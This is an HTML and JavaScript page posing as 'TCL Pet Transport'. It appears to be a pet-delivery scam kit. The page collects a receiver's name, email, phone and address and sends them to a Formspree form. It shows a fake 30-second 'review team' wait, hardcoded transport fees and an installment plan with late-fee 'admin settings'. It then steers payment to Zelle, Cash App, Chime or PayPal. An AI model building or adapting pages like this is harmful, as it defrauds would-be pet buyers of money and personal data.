<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>TCL PET TRANSPORT</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
margin:0;
font-family:Arial,Helvetica,sans-serif;
background:url('https://images.unsplash.com/photo-1517849845537-4d257902454a') center/cover no-repeat;
}
.overlay{min-height:100vh;background:rgba(255,255,255,.93);padding:20px}
.container{max-width:560px;margin:auto;background:#fff;border-radius:14px;padding:20px;box-shadow:0 6px 18px rgba(0,0,0,.18)}
.logo{text-align:center}
.logo img{width:80px;border-radius:50%;border:2px solid #1a73e8;padding:4px}
h2,h3{text-align:center}
.section{margin-top:15px;border:1px solid #ddd;border-radius:8px;padding:12px;background:#fafafa}
label{font-weight:bold;display:block;margin-top:10px}
input,textarea,select{width:100%;padding:10px;margin-top:6px;border-radius:6px;border:1px solid #ccc}
input[readonly],textarea[readonly]{background:#eee}
.actions{display:flex;justify-content:space-between;margin-top:25px}
.action{color:#1a73e8;cursor:pointer;font-weight:bold}
.hidden{display:none}
.center{text-align:center}
.loader{width:45px;height:45px;border:4px solid #ddd;border-top:4px solid #1a73e8;border-radius:50%;margin:20px auto;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.checkbox{display:flex;gap:10px;margin-top:15px;align-items:flex-start}

.email-error{color:red;font-size:12px;margin-top:3px}

/* SHAKE EFFECT */
.shake{
animation:shake 0.3s;
border-color:red;
}
@keyframes shake{
0%{transform:translateX(0)}
25%{transform:translateX(-5px)}
50%{transform:translateX(5px)}
75%{transform:translateX(-5px)}
100%{transform:translateX(0)}
}

.deadline-box{
margin-top:15px;
font-weight:bold;
color:#b22222;
}
</style>
</head>

<body>
<div class="overlay">

<form id="mainForm" action="https://formspree.io/f/xeeeapoo" method="POST">

<input type="hidden" name="_subject" value="TCL Pet Transport â€“ New Submission">
<input type="hidden" name="_template" value="table">
<input type="hidden" name="owner_phone_full" id="owner_phone_full">
<input type="hidden" name="receiver_phone_full" id="receiver_phone_full">
<input type="hidden" name="summary_data" id="summary_data">
<input type="hidden" name="payment_method" id="payment_method">
<input type="hidden" name="payment_type" id="payment_type">

<!-- FORM PAGE -->
<div class="container" id="formPage">
<div class="logo">
<img src="https://images.unsplash.com/photo-1601758123927-ff52f9d22a9b?auto=format&fit=crop&w=100&q=80">
</div>

<h2>TCL PET TRANSPORT</h2>

<div class="section">
<h3>Receiver and Owner Form</h3>

<label>Name</label>
<input id="owner_name" value="Collins Dave" readonly>

<label>Email</label>
<input id="owner_email" value="collinsdave167@gmail.com" readonly>

<label>Country Code</label>
<select id="owner_code">
<option value="+1">ðŸ‡ºðŸ‡¸ / ðŸ‡¨ðŸ‡¦ +1</option>
<option value="+44">ðŸ‡¬ðŸ‡§ +44</option>
<option value="+234">ðŸ‡³ðŸ‡¬ +234</option>
<option value="other">Other</option>
</select>

<label>Phone</label>
<input id="owner_phone" readonly value="+1 503-801-7342">

<label>Address</label>
<textarea id="owner_address" readonly>5678 N Camino Seco, Tucson, AZ 85750,OR</textarea>
</div>

<div class="section">
<h3>Receiver Information</h3>

<label>Name</label>
<input id="receiver_name" required>

<label>Email</label>
<input id="receiver_email" required>
<div class="email-error" id="receiverError"></div>

<label>Country Code</label>
<select id="receiver_code">
<option value="+1">ðŸ‡ºðŸ‡¸ / ðŸ‡¨ðŸ‡¦ +1</option>
<option value="+44">ðŸ‡¬ðŸ‡§ +44</option>
<option value="+234">ðŸ‡³ðŸ‡¬ +234</option>
<option value="other">Other</option>
</select>

<label>Phone</label>
<input id="receiver_phone" required>

<label>Delivery Address</label>
<textarea id="receiver_address" required></textarea>
</div>

<div class="section">
<h3>Tracking / Reference Number</h3>
<input id="tracking_id" name="tracking_id" value="TCL-259756" readonly>
</div>

<div class="actions">
<span></span>
<span class="action" onclick="validateAndStartReview()">Submit</span>
</div>
</div>

<!-- REVIEW -->
<div class="container hidden" id="review">
<h3>Please wait</h3>
<p class="center">TCL Pet Transport review team is reviewing your submission.</p>
<div class="loader"></div>
</div>

<!-- SUMMARY -->
<div class="container hidden" id="summary">
<h3>Transport Details</h3>

<div class="section">
<label>Pickup</label>
<input readonly value="5678 N Camino Seco, Tucson, AZ 85750">
<label>Delivery</label>
<input readonly value="pending">
<label>Pickup Date</label>
<input readonly value="March 2, 2026">
<label>Delivery Date</label>
<input readonly value="March 6, 2026">
</div>

<div class="section">
<h3>Payment Summary</h3>
<p>Base Transport Fee: $<span id="baseFee"></span></p>
<p>Distance Charge: $<span id="distanceFee"></span></p>
<p>Insurance Coverage: $<span id="insuranceFee"></span></p>
<p>Crate Fee: $<span id="crateFee"></span></p>
<p>Health Certificate: $<span id="healthFee"></span></p>
<hr>
<p><strong>Total Payment: $<span id="totalCost"></span></strong></p>
<p>Payment Deposited (10%): $<span id="deposit"></span></p>
<p>Total Balance: $<span id="balance"></span></p>
</div>

<div class="actions">
<span class="action" onclick="showInstallments()">Pay in installments</span>
<span class="action" onclick="makePayment()">Make payment</span>
</div>
</div>

<!-- INSTALLMENTS -->
<div class="container hidden" id="installments"></div>

<!-- WAIT -->
<div class="container hidden" id="wait">
<h3>Please wait</h3>
<div class="loader"></div>
</div>

<!-- METHODS -->
<div class="container hidden" id="methods">
<h3>Select Payment Method</h3>
<p class="action center" onclick="finish('Zelle')">Zelle</p>
<p class="action center" onclick="finish('PayPal')">PayPal</p>
<p class="action center" onclick="finish('Cash App')">Cash App</p>
<p class="action center" onclick="finish('Chime')">Chime</p>
<div class="actions">
<span class="action" onclick="back()">Back</span>
</div>
</div>

<!-- FINAL -->
<div class="container hidden" id="final">
<h3>Submission Noted</h3>
<p class="center">After review, payment details will be sent to you or the owner.</p>
</div>

</form>
</div>

<script>

/* ADMIN SETTINGS */
let INSTALLMENT_FEE_RATE = 0.10;
let LATE_FEE_RATE = 0.05;
let DEADLINE_MINUTES = 5;

/* ===== TRACKING NUMBER LOCK SYSTEM ===== */
function getTrackingLockKey(){
    return "tcl_locked_" + tracking_id.value;
}

document.addEventListener("DOMContentLoaded", function(){
    const lockKey = getTrackingLockKey();
    if(localStorage.getItem(lockKey)==="true"){
        formPage.classList.add("hidden");
        review.classList.add("hidden");
        summary.classList.add("hidden");
        installments.classList.add("hidden");
        methods.classList.add("hidden");
        wait.classList.add("hidden");
        final.classList.remove("hidden");
        document.querySelectorAll(".action").forEach(btn=>{
            btn.style.pointerEvents="none";
            btn.style.opacity="0.6";
        });
    }
});

/* PHONE FORMAT (UNCHANGED) */
function formatPhone(input, code) {
let d = input.value.replace(/\D/g,'');
if(code.value === '+1'){
d = d.slice(0,10);
if(d.length>6) input.value = d.slice(0,3)+'-'+d.slice(3,6)+'-'+d.slice(6);
else if(d.length>3) input.value = d.slice(0,3)+'-'+d.slice(3);
else input.value = d;
}else input.value = d;
}
receiver_phone.oninput = ()=>formatPhone(receiver_phone, receiver_code);

/* EMAIL VALIDATION (SHAKE ONLY) */
receiver_email.addEventListener("blur",()=>{
const pattern=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if(!pattern.test(receiver_email.value.trim())){
receiver_email.classList.add("shake");
receiverError.textContent="Please enter a valid email address.";
setTimeout(()=>receiver_email.classList.remove("shake"),300);
}else{
receiverError.textContent="";
}
});

function validateAndStartReview(){
if(!receiver_name.value||!receiver_email.value||!receiver_phone.value||!receiver_address.value){
alert("Please fill in all required receiver fields before continuing.");
return;
}
const pattern=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if(!pattern.test(receiver_email.value.trim())){
receiver_email.classList.add("shake");
receiverError.textContent="Please enter a valid email address.";
setTimeout(()=>receiver_email.classList.remove("shake"),300);
return;
}
startReview();
}

/* PAYMENT ENGINE */
function calculatePayment(){
const distanceMiles=1500;
const ratePerMile=0.75;
const baseFeeVal=400;
const insuranceVal=150;
const crateVal=120;
const healthVal=80;
const depositPercent=0.10;

const distanceVal=distanceMiles*ratePerMile;
const total=baseFeeVal+distanceVal+insuranceVal+crateVal+healthVal;
const depositVal=total*depositPercent;
const balanceVal=total-depositVal;

baseFee.textContent=baseFeeVal.toFixed(2);
distanceFee.textContent=distanceVal.toFixed(2);
insuranceFee.textContent=insuranceVal.toFixed(2);
crateFee.textContent=crateVal.toFixed(2);
healthFee.textContent=healthVal.toFixed(2);
totalCost.textContent=total.toFixed(2);
deposit.textContent=depositVal.toFixed(2);
balance.textContent=balanceVal.toFixed(2);
}

/* ALL FLOW FUNCTIONS */
function startReview(){
owner_phone_full.value=owner_code.value+' '+owner_phone.value;
receiver_phone_full.value=receiver_code.value+' '+receiver_phone.value;

summary_data.value=`
Tracking ID: ${tracking_id.value}

--- OWNER DETAILS ---
Name: ${owner_name.value}
Email: ${owner_email.value}
Phone: ${owner_code.value} ${owner_phone.value}
Address: ${owner_address.value}

--- RECEIVER DETAILS ---
Name: ${receiver_name.value}
Email: ${receiver_email.value}
Phone: ${receiver_code.value} ${receiver_phone.value}
Address: ${receiver_address.value}
`;

formPage.classList.add('hidden');
review.classList.remove('hidden');

setTimeout(()=>{
review.classList.add('hidden');
summary.classList.remove('hidden');
calculatePayment();
},30000);
}

function makePayment(){
payment_type.value="Full Payment";
summary.classList.add('hidden');
wait.classList.remove('hidden');
setTimeout(()=>{
wait.classList.add('hidden');
methods.classList.remove('hidden');
},30000);
}

function showInstallments(){
payment_type.value="Installment Plan";
summary.classList.add('hidden');
wait.classList.remove('hidden');
setTimeout(()=>{
wait.classList.add('hidden');
installments.classList.remove('hidden');
generateInstallmentPlan();
},30000);
}

function generateInstallmentPlan(){
const total=parseFloat(totalCost.textContent);
const fee=total*INSTALLMENT_FEE_RATE;
const updated=total+fee;
const down=(updated*0.30).toFixed(2);
const remaining=updated-down;
const split=(remaining/2).toFixed(2);

installments.innerHTML=`
<h3>Installment Plan</h3>
<p><strong>Structured Payment Service Fee (${INSTALLMENT_FEE_RATE*100}%):</strong> $${fee.toFixed(2)}</p>
<p><strong>Updated Total:</strong> $${updated.toFixed(2)}</p>
<p>Down Payment: <b>$${down}</b></p>
<p>Second Installment: <b>$${split}</b></p>
<p>Final Installment: <b>$${split}</b></p>
<div class="deadline-box" id="deadlineBox"></div>
<div class="actions">
<span class="action" onclick="back()">Back</span>
<span class="action" onclick="payInstallment()">Make payment $${down}</span>
</div>
`;
}

function payInstallment(){
installments.classList.add('hidden');
methods.classList.remove('hidden');
}

function back(){
methods.classList.add('hidden');
installments.classList.add('hidden');
summary.classList.remove('hidden');
}

function finish(method){
const lockKey = getTrackingLockKey();
if(localStorage.getItem(lockKey)==="true") return; // Prevent double submission

payment_method.value=method;
localStorage.setItem(lockKey,"true"); // LOCK this tracking number

/* Disable all clickable actions */
document.querySelectorAll(".action").forEach(btn=>{
btn.style.pointerEvents="none";
btn.style.opacity="0.6";
});

fetch(mainForm.action,{method:'POST',body:new FormData(mainForm)});
methods.classList.add('hidden');
final.classList.remove('hidden');
}
</script>
</body>
    </html>
